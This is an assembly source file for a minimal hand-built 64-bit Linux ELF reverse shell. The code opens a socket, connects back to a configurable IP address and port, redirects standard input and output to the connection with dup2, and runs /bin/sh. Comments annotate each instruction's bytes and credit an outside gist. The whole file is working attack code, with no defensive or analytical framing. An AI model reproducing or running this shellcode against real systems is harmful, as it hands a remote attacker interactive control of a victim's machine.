BITS 64
  org 0x100000000
  db 0x7F, "ELF"                ;            7f454c46 | 0x0-0x3         Elf Magic Byte
_start:                         ; 
  ;--- socket syscall ----------------------------------------------------------
  push byte 0x29                ;                6a29 | Syscall 41 - socket 
  pop rax                       ;                  58 | Putting it into RAX 
  push byte 0x2                 ;                6a02 | AF_INET
  pop rdi                       ;                  5f | Into RDI 
  push byte 0x1                 ;                6a01 | SOCK_STREAM
  pop rsi                       ;                  5e | Into RSI 
  cdq                           ;                  99 | Put 0 into RDX because CDQ sign extends AX/EAX and stores in DX/EDX. So rdx = 0 - ANY
  jmp short conec               ; Then onto the rest of our code 
  ; Header struct                 OFFS  ELFHDR      PHDR    
  dw 2                          ; @0x10 e_type              
  dw 0x3e                       ; @0x12 e_machine           
  dd 1                          ; @0x14 e_version           
  dd _start - $$                ; @0x18 e_entry             
phdr:          
  dd 1                          ; @0x1C             p_type
  dd phdr - $$                  ; @0x20 e_phoff     p_flags  
  dd 0                          ; @0x24             p_offset
  dd 0                          ; @0x28 e_shoff     
  dq $$                         ; @0x2C             p_vaddr
                                ; @0x30 e_flags
  dw 0x40                       ; @0x34 e_ehsize    p_addr 
  dw 0x38                       ; @0x36 e_phentsize 
  dw 1                          ; @0x38 e_phnum
  dw 2                          ; @0x3A e_shentsize 
execy:
  add al, 0x3b                  ;                 043b | execve syscall
  syscall                       ;                 0f05 | run itt
  dd 0
  add al, 0x3b                  ;                 043b | execve syscall
  syscall                       ;                 0f05 | run itt
  dd 0
  ;dq 2                          ; @0x3C e_shnum     p_filesz
  ;dq 2                          ; @0x44             p_memsz
conec:                          ; @0x4C
  syscall                       ;                 0f05 | Execute the syscall we set up earlier.
  ;--- connect syscall ---------------------------------------------------------
  xchg rdi, rax                 ;                 4897 | Save socket descriptor
  mov dword [rsp-4], IPADDRESS  ;     c74424fc7f000001 | Our IP   = 127.0.0.1 (0xdd01a8c0)
  mov word  [rsp-6], PORTNUMBER     ;       66c74424faa455 | Our Port = 42069 (0x5c11)
  mov byte  [rsp-8], 0x02       ;           c64424f802 | 
  sub rsp, 8                    ;             4883ec08 | sub sp makes no difference
  push byte 0x2a                ;                 6a2a | Connect syscall
  pop rax                       ;                   58 | move into rax
  mov rsi, rsp                  ;               4889e6 | pointer to socket struct
  push byte 0x10                ;                 6a10 | length
  pop rdx                       ;                   5a | length -> rdx
  syscall                       ;                 0f05 | Execute the connect syscall
  ;--- dup2 syscall ------------------------------------------------------------
  push byte 0x3                 ;                 6a03 | counter 
  pop rsi                       ;                   5e | move into rsi
dup2_loop:              
  dec rsi                       ;               48ffce | decrement before syscall. 2
  push byte 0x21                ;                 6a21 | dup2 syscall 
  pop rax                       ;                   58 | move into rax
  syscall                       ;                 0f05 | call it
  jnz dup2_loop                 ;                 75f6 | jump if not 0   
  ; syscall 0x21 sys_dup2    - loops 3 times
  ; dup2 duplicates the FD that is being sent. 
  ; http://man7.org/linux/man-pages/man2/dup.2.html
  ; RDI: unsigned int oldfd = ?
  ; RSI: unsigned int newfd = 2 -> 0 after loop
  ;--- Read Buffer -------------------------------------------------------------
  ;mov rdi, rax                 ;               4889c7 | socket - This is 0 in practice tho bc syscall success. so can actually just get rid of it.
  cdq                           ;                   99 | Converts signed long to signed double long -basically zeros out rdx
  mov byte [rsp-1], al          ;             884424ff | This is 0 already in RAX, so we are reusing this value a few times.
  sub rsp, 1                    ;             4883ec01 | 
  push rdx                      ;                   52 | 
  lea rsi, [rsp-0x10]           ;           488d7424f0 | 16 bytes from buf
  add dl, 0x10                  ;               80c210 | size_t count
  syscall                       ;                 0f05 | 
  ; syscall 0 sys_read 
  ; RDI: unsigned int fd  - The socket fd - 3
  ; RSI: char *buf        - 16 bytes
  ; RDX: size_t count     - 0x10 
  ;--- execve /bin/sh ----------------------------------------------------------
  xor rax, rax                  ;               4831c0 | make 0
  mov rbx, 0x68732f2f6e69622f   ; 48bb2f62696e2f2f7368 | /bin//sh in reverse
  push rbx                      ;                   53 | push this string to the stack
  mov rdi, rsp                  ;               4889e7 | move pointer to the string to rdi
  push rax                      ;                   50 | push a 0 
  mov rdx, rsp                  ;               4889e2 | push pointer to 0 to rdx
  push rdi                      ;                   57 | push /bin//sh string to stack
  mov rsi, rsp                  ;               4889e6 | move pointer to it to rsi
  jmp short execy               ;                 eb8d | Back up into program headers
  
  ; stolen from Yuu, original source: https://gist.githubusercontent.com/yuudev/187fb1d7bc925b4e2a2e61c76ae695ac/raw/3ff4e146f97707b5ab13d1e589202181fcff5667/reversi.asm 
